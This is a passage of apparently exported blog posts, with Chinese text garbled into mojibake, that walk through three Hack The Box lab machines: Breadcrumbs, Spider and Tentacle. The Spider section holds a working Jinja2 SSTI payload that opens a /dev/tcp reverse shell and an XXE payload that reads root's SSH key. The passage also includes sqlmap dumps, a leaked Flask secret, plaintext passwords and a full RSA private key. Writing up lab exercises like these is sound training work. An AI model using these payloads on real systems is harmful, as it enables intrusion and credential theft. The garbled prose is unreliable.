C:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\n```\n![](Hackthebox-Breadcrumbs/2606c3a6-0297-46e8-98a3-3cb4fba09389.png)\n\nç°åœ¨æˆ‘ä»¬è¦æŠŠsqliteæ–‡ä»¶æä¸‹æ¥\n\nè¿™é‡Œä»€ä¹ˆsmbå…±äº«å•Š ncä¼ è¾“å•Š æˆ–æ˜¯å…¶ä»–æ–¹å¼çš„ï¼Œå¾ˆå¤šæ–¹æ³•ï¼Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ï¼Œå¤§å®¶ç”¨è‡ªå·±å–œæ¬¢çš„æ–¹æ³•æå§ã€‚æä¸‹æ¥åï¼Œåœ¨è‡ªå·±ç”µè„‘ä¸Šä¹Ÿè¦æ”¾åœ¨åŒä¸€ä½ç½®ï¼Œç„¶åè¿›è¡ŒæŸ¥çœ‹\n\n```cpp\njuliette: jUli901./())!\ndevelopment: fN3)sN5Ee@g\nadministrator: [MOVED]\n```\nè¿™æ˜¯å’±ä»¬å¾—åˆ°çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯†ç \n\nå’±ä»¬ä½¿ç”¨sshç™»å½•developmentè¿™ä¸ªè´¦æˆ·\n\n![](Hackthebox-Breadcrumbs/06357381-0eaa-41fe-8895-383c003acab2.png)\n\n![](Hackthebox-Breadcrumbs/cd414f8b-3e49-4881-af68-6b260168a15c.png)\n\nå’±ä»¬æ£€æŸ¥ä¸€ä¸‹krypter\\_linux\n\nå’±ä»¬ç”¨ä¸Šé¢ç›¸åŒçš„æ”¾å¼ç»™æä¸‹æ¥ï¼Œç„¶åæŸ¥çœ‹\n\n![](Hackthebox-Breadcrumbs/3581de3d-b044-4746-8c53-73d5e1281246.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºå™¨ä½äº1234ç«¯å£\n\næä»–\n\nå’±ä»¬ä½¿ç”¨sshåšä¸€ä¸ªåŠ¨æ€ç«¯å£è½¬å‘\n\n```cpp\nssh -L 1234:127.0.0.1:1234 [development@10.10.10.228](mailto:development@10.10.10.228)\n```\nç„¶åè®©æˆ‘ä»¬è®¿é—®ä¸€ä¸‹è¿™ä¸ªé¡µé¢\n\n```cpp\ncurl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'\n```\n![](Hackthebox-Breadcrumbs/d895b412-e2e4-4dc1-b88c-43eace3df37b.png)\n\næˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªaeså¯†é’¥k19D193j.<19391(\n\næˆ‘ä»¬ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥\n\n```cpp\nsqlmap -u http://127.0.0.1:1234/index.php\\?method\\=select\\&username\\=administrator\\&table\\=passwords --dump\n```\n![](Hackthebox-Breadcrumbs/377d42bf-dcc5-4f83-9393-0d2875648319.png)\n\n```cpp\naccount = Administrator\naes_key = k19D193j.<19391(\npassword = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=\n```\nä½¿ç”¨åœ¨çº¿å·¥å…·è¿›è¡Œè§£å¯†\n\n> [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption)\n\n![](Hackthebox-Breadcrumbs/7f8b6af4-c154-4bf2-99a3-a781a3973a0f.png)\n\n```cpp\ncEBzc3cwcmQhQCMkOTg5MC4v\n```\næˆ‘ä»¬ä½¿ç”¨base64è¿›è¡Œè§£å¯†\n\n![](Hackthebox-Breadcrumbs/396206c5-a50b-4645-b5d4-d7194941a1fc.png)\n\n```cpp\n[p@ssw0rd!@#$9890./](mailto:p@ssw0rd!@#$9890./)\n```\nä½¿ç”¨sshç™»å½•administratorè´¦æˆ·å³å¯\n\n![](Hackthebox-Breadcrumbs/9b416034-80f1-4f68-95ac-13f9e7de4434.png)\n\nææƒadministratoræˆåŠŸ\n\n![](Hackthebox-Breadcrumbs/8430ab0c-c686-43ef-b095-587aa0730a73.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næ”¶å·¥åƒå¤œå®µ","tags":["Hackthebox"]},{"title":"Spider - Hackthebox","url":"/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/","content":"\n# Hackthebox - Spider\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Spider/bc3a1e99-fb8a-4f92-9b33-ccc48ef886c3.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Spider/f6acdc5b-7a37-4d88-8fca-330091eff548.png)\n\n**ä¿¡æ¯æœé›†**\n\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```\nnmap -A -sS -sV -sC 10.10.10.243\n```\n\n![](Hackthebox-Spider/a883c068-7413-4bed-ae09-6da01098c91f.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨22å’Œ80ç«¯å£ï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹80ç«¯å£\n\n![](Hackthebox-Spider/17240d54-3a90-4ec6-b89a-67a9b6c73b1f.png)\n\nä¼šè¢«é‡å®šå‘åˆ°spider.htbï¼Œå’±ä»¬å…ˆæŠŠå®ƒåŠ å…¥hostsæ–‡ä»¶å§\n\n```\necho 10.10.10.243 spider.htb > /etc/hosts\n```\n\n![](Hackthebox-Spider/c0a054e4-7f1a-4166-b6d2-86d6ba76cea9.png)\n\nå†è®¿é—®å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªå®¶å…·é¡µé¢ï¼Œå’±ä»¬åšä¸€ä¸‹ä¿¡æ¯æœé›†\n\n```\ngobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50\n```\n\n![](Hackthebox-Spider/eea7666e-c72a-40f1-940f-c686b73917f9.png)\n\n```\n/cart (Status: 500) \\[Size: 290\\]\n/checkout (Status: 500) \\[Size: 290\\]\n/index (Status: 200) \\[Size: 11273\\]\n/login (Status: 200) \\[Size: 1832\\]\n/logout (Status: 302) \\[Size: 209\\] \\[--> http://spider.htb/\\]\n/main (Status: 302) \\[Size: 219\\] \\[--> http://spider.htb/login\\]\n/register (Status: 200) \\[Size: 2130\\]\n/user (Status: 302) \\[Size: 219\\] \\[--> http://spider.htb/login\\]\n/view (Status: 302) \\[Size: 219\\] \\[--> [http://spider.htb/login](http://spider.htb/login)\\]\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œèƒ½è®¿é—®çš„åªæœ‰æ³¨å†Œé¡µé¢å’Œç™»å½•é¡µé¢ï¼Œå’±ä»¬å…ˆå»çœ‹çœ‹æ³¨å†Œé¡µé¢\n\n![](Hackthebox-Spider/9b5915ec-5ceb-4a12-afb0-693bb773bcd5.png)\n\nå’±ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·\n\n![](Hackthebox-Spider/fda6ccca-b9e4-415d-b50a-804ac10c7cd3.png)\n\n```\n7443d68c-02b2-428c-b622-af15604cd905\n```\n\nå’±ä»¬å¾—åˆ°äº†ä¸€æ®µUUIDï¼Œä½¿ç”¨å¯†ç ç™»å½•è¯•è¯•\n\n![](Hackthebox-Spider/5994df2b-3b30-48c5-9ce2-f6e71dcb5a91.png)\n\nç™»å½•åä¼¼ä¹ä¹Ÿåªæœ‰è¿™ä¸ªé¡µé¢å¯ä»¥ç‚¹å‡»ï¼Œå’±ä»¬å†å¤šçœ‹çœ‹\n\nåœ¨åšä¿¡æ¯æœé›†çš„æ—¶å€™ï¼Œçªç„¶é†’æ‚Ÿè¿‡æ¥ï¼Œè¿™ä¼šä¸ä¼šæ˜¯ä¸ªSSTIï¼Ÿå’±ä»¬æµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Spider/708b8be6-9466-494c-b73d-26f5094de36b.png)\n\nå’±ä»¬æµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Spider/c518d2b5-98a6-4d03-9553-c638226ae439.png)\n\nç™»é™†åæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯\n\n![](Hackthebox-Spider/179c86cf-a77b-4d73-b55f-a9c61a9a5b0d.png)\n\nå¥½å®¶ä¼™ï¼Œç¡®å®æ˜¯\n\nè¿™é‡Œå¯ä»¥è¿›è¡ŒSSTIæ”»å‡»ï¼Œé‚£ä¹ˆæ„å‘³ç€æœåŠ¡å™¨æ­£åœ¨è¿è¡ŒJinja2æˆ–è€…Flaskï¼Œè¿™é‡Œæ˜¯Flask\n\n**æ¼æ´åˆ©ç”¨**\n\nè¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹configä¿¡æ¯ï¼Œæ³¨å†Œä¸€ä¸ª{{config}}ç”¨æˆ·\n\n![](Hackthebox-Spider/82db4e28-cc7f-4aa3-a8f7-0fe7812eb486.png)\n\n![](Hackthebox-Spider/8ea66433-79fb-4559-a243-2876806263e4.png)\n\n```\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE\\_EXCEPTIONS': None, 'PRESERVE\\_CONTEXT\\_ON\\_EXCEPTION': None, 'SECRET\\_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT\\_SESSION\\_LIFETIME': datetime.timedelta(31), 'USE\\_X\\_SENDFILE': False, 'SERVER\\_NAME': None, 'APPLICATION\\_ROOT': '/', 'SESSION\\_COOKIE\\_NAME': 'session', 'SESSION\\_COOKIE\\_DOMAIN': False, 'SESSION\\_COOKIE\\_PATH': None, 'SESSION\\_COOKIE\\_HTTPONLY': True, 'SESSION\\_COOKIE\\_SECURE': False, 'SESSION\\_COOKIE\\_SAMESITE': None, 'SESSION\\_REFRESH\\_EACH\\_REQUEST': True, 'MAX\\_CONTENT\\_LENGTH': None, 'SEND\\_FILE\\_MAX\\_AGE\\_DEFAULT': datetime.timedelta(0, 43200), 'TRAP\\_BAD\\_REQUEST\\_ERRORS': None, 'TRAP\\_HTTP\\_EXCEPTIONS': False, 'EXPLAIN\\_TEMPLATE\\_LOADING': False, 'PREFERRED\\_URL\\_SCHEME': 'http', 'JSON\\_AS\\_ASCII': True, 'JSON\\_SORT\\_KEYS': True, 'JSONIFY\\_PRETTYPRINT\\_REGULAR': False, 'JSONIFY\\_MIMETYPE': 'application/json', 'TEMPLATES\\_AUTO\\_RELOAD': None, 'MAX\\_COOKIE\\_SIZE': 4093, 'RATELIMIT\\_ENABLED': True, 'RATELIMIT\\_DEFAULTS\\_PER\\_METHOD': False, 'RATELIMIT\\_SWALLOW\\_ERRORS': False, 'RATELIMIT\\_HEADERS\\_ENABLED': False, 'RATELIMIT\\_STORAGE\\_URL': 'memory://', 'RATELIMIT\\_STRATEGY': 'fixed-window', 'RATELIMIT\\_HEADER\\_RESET': 'X-RateLimit-Reset', 'RATELIMIT\\_HEADER\\_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT\\_HEADER\\_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT\\_HEADER\\_RETRY\\_AFTER': 'Retry-After', 'UPLOAD\\_FOLDER': 'static/uploads'}>\n```\n\næˆ‘ä»¬å¾—åˆ°äº†ç›¸å…³çš„é…ç½®ä¿¡æ¯\n\næˆ‘ä»¬ç­›é€‰ä¸€ä¸‹å…¶ä¸­çš„å…³é”®ä¿¡æ¯\n\n```\nsecret\\_key = Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\n```\n\né¦–å…ˆå®‰è£…ä¸€ä¸‹å’±ä»¬éœ€è¦çš„æ¨¡å—\n\npip3 install flask\\_unsign\n\nç„¶åå’±ä»¬ä½¿ç”¨sqlmapçš„evalå¤„ç†sessionå‚æ•°\n\n```\nsqlmap http://spider.htb/ --eval \"from flask\\_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')\" --cookie=\"session=\\*\" --delay 1 --dump\n```\n\nç¬¬ä¸€ä¸ªé€‰é¡¹è¾“å…¥Yï¼Œåé¢çš„éƒ½è¾“å…¥N\n\n![](Hackthebox-Spider/1b5dd0b8-961a-4081-9f24-4272a4191241.png)\n\næˆåŠŸå¾—åˆ°uuidå’Œpassword\n\n```\nuuid = 129f60ea-30cf-4065-afb9-6be45ad38b73\npassword = ch1VW4sHERE7331\n```\n\nå’±ä»¬å»ç™»å½•\n\n![](Hackthebox-Spider/81fc7cdb-8b81-4bfa-bcc6-0dee6017b0d0.png)\n\nå•Šå“ˆï¼Œè¿™æ¬¡å‡ºç°ä¸ä¸€æ ·çš„ç•Œé¢äº†\n\n![](Hackthebox-Spider/873f3e1d-ecf8-4e32-99f8-2fbc15a8f3fe.png)\n\nè®©æˆ‘ä»¬å»æ£€æŸ¥ä¸€ä¸‹messages\n\n![](Hackthebox-Spider/b3470c7e-f903-4ade-9d15-a2b309dcc531.png)\n\n```\n/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal\n```\n\nå’±ä»¬å¾—åˆ°äº†ä¸€ä¸ªé“¾æ¥ï¼Œå»è®¿é—®ä¸€ä¸‹\n\n[http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal](http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal)\n\n![](Hackthebox-Spider/0f35ef84-d78e-4c5c-8872-ffe206f2a287.png)\n\né¦–å…ˆè®©æˆ‘ä»¬æ„é€ payload\n\n```\nbash -c 'exec bash -i &>/dev/tcp/10.10.14.54/4444 <&1'\n```\n\nç„¶åè½¬åŒ–ä¸ºbase64æ ¼å¼\n\n```\nYmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn\n```\n\nç„¶åæ„é€ poc\n\n```\n{% with a = request\\[\"application\"\\]\\[\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"\\]\\[\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"\\][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")[\"popen\"](\"echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn | base64 -d | bash\")\\[\"read\"\\]() %} a {% endwith %}\n```\n\nç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```\nnc -nvlp 4444\n```\n\n![](Hackthebox-Spider/f79a09de-9ce2-49c3-9bdd-1883f5c634cf.png)\n\n![](Hackthebox-Spider/35f02974-11cd-4104-a425-7098b6a3bddf.png)\n\næˆåŠŸgetshell\n\n![](Hackthebox-Spider/aa0b7469-fe6b-4080-9943-eb7807d0a19d.png)\n\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n**æƒé™æå‡**\n\n![](Hackthebox-Spider/f68c197d-856d-42a9-9f31-b7f1d528dbe9.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°/home/chivç›®å½•ä¸‹å­˜åœ¨.sshç›®å½•ï¼Œé‚£åº”è¯¥æ˜¯å­˜åœ¨å¯†é’¥çš„ï¼Œå’±ä»¬è¿›å»çœ‹çœ‹\n\n![](Hackthebox-Spider/46c68b8a-cd88-41c9-8f01-351ee9706404.png)\n\næˆåŠŸæ‹¿åˆ°ç§é’¥\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV\ngjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS\nU7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9\nMI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7\nBLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2\nVTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu\n6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs\nhx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl\nZ5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc\nXVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq\n54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy\nf0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62\nnKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL\nj0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO\nJjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW\nK1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv\nhm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ\nmQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8\ngu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb\n0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2\nnfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W\nCeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG\nrbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO\nTTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6\nIleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==\n-----END RSA PRIVATE KEY-----\n```\n\nä¿å­˜åˆ°æœ¬åœ°\n\nä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n![](Hackthebox-Spider/4e24d428-5099-4dd1-9973-948c7826023b.png)\n\nç™»å½•æˆåŠŸ\n\næŸ¥çœ‹ä¸€ä¸‹æ­£åœ¨è¿è¡Œçš„ç«¯å£\n\n```\nss -tupln\n```\n\n![](Hackthebox-Spider/f9981509-39d4-4c44-bc42-e6e942df9bae.png)\n\nå’±ä»¬å‘ç°æœ¬åœ°è¿è¡Œç€8080ç«¯å£\n\nå’±ä»¬éœ€è¦æŠŠç«¯å£è½¬å‘å‡ºæ¥\n\n```\nssh -i id\\_chiv -L 8080:localhost:8080 chiv@spider.htb\n```\n\nç„¶åå’±ä»¬æ‰“å¼€firefoxè¿›è¡Œè®¿é—®[http://127.0.0.1:8080/](http://127.0.0.1:8080/)\n\n![](Hackthebox-Spider/1ab2a0c4-e8c9-40cc-a0df-5b6e31eff10b.png)\n\nç«¯å£è½¬å‘æˆåŠŸ\n\n![](Hackthebox-Spider/cb10a2af-685b-41d0-a42f-5fc5d7a16f89.png)\n\nè¿™è¾¹éšä¾¿ä¸€ä¸ªè´¦æˆ·éƒ½å¯ä»¥ç™»å½•\n\n![](Hackthebox-Spider/a05250c6-2ecb-4d90-a13d-ce02a299c18a.png)\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹cookieï¼Œè¿™é‡Œcookieéœ€è¦è§£å¯†\n\n```\n.eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw\n```\n\nä½¿ç”¨flask-unsignè¿›è¡Œè§£ç \n\n```\nflask-unsign --decode --cookie .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw\n```\n\nè¿”å›äº†ä¸€æ®µbase64ç \n\n```\n{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=', 'points': 0}\n```\n\nå’±ä»¬è§£å¯†ä¸€ä¸‹\n\n![](Hackthebox-Spider/714b09f4-e1bb-40c4-b75b-262fb14c92fd.png)\n\nå’±ä»¬æŸ¥çœ‹æºä»£ç \n\n![](Hackthebox-Spider/f43ce31d-0dce-46dd-aaa9-c12f91ffe119.png)\n\næˆ‘ä»¬åœ¨ç™»å½•é¡µé¢çš„æºä»£ç ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªhiddenå€¼ï¼Œæ‰€ä»¥å’±ä»¬å¯ä»¥åˆ©ç”¨XXEæ”»å‡»\n\nå‚è€ƒé“¾æ¥\n\n> [https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection)\n\nå’±ä»¬æ„é€ ä¸€ä¸ªpoc\n\n```\nusername=%26username%3b&version=1.0.0--><!DOCTYPE+foo+\\[<!ENTITY+username+SYSTEM+\"/root/.ssh/id\\_rsa\">+\\]><!--\n```\n\nç„¶åä½¿ç”¨burpæŠ“ä¸ªåŒ…\n\nç„¶åå’±ä»¬åŠ å…¥æ„é€ çš„poc\n\n![](Hackthebox-Spider/5792fa2c-bb02-4b45-a82f-d99dd0a681a1.png)\n\n![](Hackthebox-Spider/bab9f47c-5225-4a79-a8c4-7c4a92a22020.png)\n\n![](Hackthebox-Spider/f989eb92-b70d-4f9e-b98e-077dc08aa466.png)\n\næˆåŠŸè·å¾—rootç”¨æˆ·çš„å¯†é’¥\n\nå’±ä»¬ä¿å­˜åˆ°æœ¬åœ° ä½¿ç”¨å¯†é’¥è¿›è¡Œç™»å½•\n\n![](Hackthebox-Spider/83e5d54e-8dd5-4924-a717-c18d37fc3ea2.png)\n\næˆåŠŸç™»å½•rootæƒé™\n\n![](Hackthebox-Spider/d47f85a6-e834-4d86-9ed0-b6a751df3c7b.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","tags":["Hackthebox"]},{"title":"Tentacle - Hackthebox","url":"/2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/","content":"\n# Hackthebox - Tentacle\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Tentacle/dd553def-8ccf-4f8d-a192-6dada7287ee2.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Tentacle/16877a67-dd27-4220-a9d2-0e3bd0ffe700.png)\n\nä¿¡æ¯æœé›†\n\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.224\n\n![](Hackthebox-Tentacle/4998f833-19d7-412e-9162-c879ea7132d8.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22ã€53ã€88ã€3128ã€9090å‡ ä¸ªç«¯å£\n\né¦–å…ˆè®©æˆ‘ä»¬çœ‹çœ‹3128ç«¯å£å§ï¼Œè¿™ä¸ªç«¯å£æ˜¯Squidä»£ç†çš„é»˜è®¤ç«¯å£ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ¯”è¾ƒæ„Ÿå…´è¶£\n\n![](Hackthebox-Tentacle/47abfa67-0cc4-4e56-afc5-ca6331045ae1.png)\n\nè¿™é‡ŒæŠ¥é”™äº†ï¼Œä½†æ˜¯ç»™å‡ºäº†ä¸€ä¸ªåŸŸårealcorp.htb\n\nç»è¿‡æµ‹è¯•ï¼Œè¯¥åŸŸåçš„ç”¨æ³•æ˜¯ä½¿ç”¨è¿™ä¸ªåŸŸåæ¥è¿›è¡Œå­åŸŸåæšä¸¾ï¼Œè¿™é‡Œä½¿ç”¨dnsenumè¿›è¡Œæšä¸¾\n\ndnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb\n\n![](Hackthebox-Tentacle/13bc0799-07f8-48b3-afb0-9b97c320959c.png)\n\nns.realcorp.htb. 259200 IN A 10.197.243.77\n\nproxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.\n\nns.realcorp.htb. 259200 IN A 10.197.243.77\n\nwpad.realcorp.htb. 259200 IN A 10.197.243.31\n\næˆ‘ä»¬å¾—åˆ°äº†å‡ ä¸ªåŸŸï¼Œä½†æ˜¯æ— æ³•ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨proxychains4æ¥æšä¸¾å®ƒ\n\nå…ˆè®©æˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹ä»£ç†é…ç½®æ–‡ä»¶/etc/proxychains.conf\n\necho \"\\[ProxyList\\]\\\\nhttp 10.10.10.224 3128\\\\nhttp 127.0.0.1 3128\\\\nhttp 10.197.243.77 3128\" > /etc/proxychains.conf\n\n![](Hackthebox-Tentacle/28ac6333-75e6-43ea-b787-631fa379b5b4.png)\n\nè®¾ç½®å¥½ä»¥åï¼Œä½¿ç”¨nmapè¿›è¡Œæ‰«æ\n\nproxychains -f /etc/proxychains.conf nmap -sT -Pn 10.197.243.31\n\n![](Hackthebox-Tentacle/9a2a412c-b84e-489e-a65b-9b241886ae4c.png)\n\nç»è¿‡éå¸¸æ¼«é•¿çš„ç­‰å¾…ä»¥åï¼Œå’±ä»¬å‘ç°å¼€å¯äº†è¿™å‡ ä¸ªç«¯å£\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ª80ç«¯å£å¼€ç€ï¼Œå’±ä»¬é€šè¿‡ä»£ç†å»è®¿é—®çœ‹çœ‹\n\nproxychains firefox wpad.realcorp.htb\n\n![](Hackthebox-Tentacle/9d3a9fb7-3097-4b75-aa62-08b6505df4c5.png)\n\næ— æ³•è¢«è®¿é—®\n\nå’±ä»¬æ·»åŠ ä¸€ä¸ªæœ¬åœ°è§£æ\n\necho 10.197.243.31 wpad.realcorp.htb > /etc/hosts\n\n![](Hackthebox-Tentacle/47a3aad3-68b8-430b-9e96-73f5814c8941.png)\n\nå†æ¬¡è®¿é—®å°±æç¤º403äº†ï¼Œå’±ä»¬åšä¸€ä¸ªä¿¡æ¯æœé›†çœ‹çœ‹\n\nproxychains dirb [http://wpad.realcorp.htb/](http://wpad.realcorp.htb/)\n\nç»è¿‡æ¼«é•¿çš„ç­‰å¾…åï¼Œå¹¶æ²¡æœ‰è·å¾—ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚\n\nç„¶åæˆ‘æŠŠç€çœ¼ç‚¹æ”¾åˆ°äº†å­åŸŸåä¸Š\n\nwpadï¼Œæˆ‘å»googleäº†ä¸€ä¸‹\n\nå‘ç°æœ‰ä¸€ä¸ªwpad.datçš„æ–‡ä»¶ï¼Œå’±ä»¬å»è¯•è¯•èƒ½ä¸èƒ½ä¸‹è½½ä¸‹æ¥\n\nproxychains firefox [http://wpad.realcorp.htb/wpad.dat](http://wpad.realcorp.htb/wpad.dat)\n\n![](Hackthebox-Tentacle/01b4ca16-4eb6-445e-ac6b-beda94744b6b.png)\n\nOK 